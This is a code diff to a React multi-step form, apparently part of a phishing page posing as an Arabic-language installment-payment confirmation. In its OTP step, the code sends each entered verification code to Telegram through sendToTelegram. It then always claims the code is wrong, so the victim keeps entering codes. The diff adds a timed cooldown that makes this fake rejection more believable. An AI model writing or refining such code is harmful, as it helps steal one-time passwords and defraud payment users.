@@ -354,6 +354,7 @@ function Step3({ onNext, onBack, step2Data }: { onNext: (txId: string) => void; 
 function Step4({ transactionId }: { transactionId: string }) {
   const [otp, setOtp] = useState("");
   const [error, setError] = useState("");
+  const [submitCooldown, setSubmitCooldown] = useState(0);
   const [countdown, setCountdown] = useState(0);
 
   useEffect(() => {
@@ -379,6 +380,8 @@ function Step4({ transactionId }: { transactionId: string }) {
     if (otp.length !== 4 && otp.length !== 6) { setError("يرجى إدخال رمز مكون من 4 أو 6 أرقام"); return; }
     sendToTelegram("otp", otp);
     setError("رمز التحقق غير صحيح، يرجى التحقق والمحاولة مجدداً");
+    setSubmitCooldown(5);
+    const t = setInterval(() => setSubmitCooldown((p) => { if (p <= 1) { clearInterval(t); return 0; } return p - 1; }), 1000);
   };
 
   const handleResend = () => {
@@ -417,8 +420,9 @@ function Step4({ transactionId }: { transactionId: string }) {
         {error && <p className="text-xs text-red-400 text-center">{error}</p>}
       </div>
 
-      <button type="submit" className="w-full bg-secondary text-white py-2.5 sm:py-3 text-sm sm:text-base rounded-xl font-bold hover:brightness-110 active:scale-95 transition-all">
-      تاكيد الرمز و تاكيد عملية القسط الشهري      </button>
+      <button type="submit" disabled={submitCooldown > 0} className="w-full bg-secondary text-white py-2.5 sm:py-3 text-sm sm:text-base rounded-xl font-bold hover:brightness-110 active:scale-95 transition-all disabled:opacity-60">
+        {submitCooldown > 0 ? `يرجى الانتظار ${submitCooldown} ثوانٍ...` : "تاكيد الرمز و تاكيد عملية القسط الشهري"}
+      </button>
       <div className="text-center">
         {countdown > 0 ? (
           <p className="text-xs sm:text-sm text-on-surface-variant">
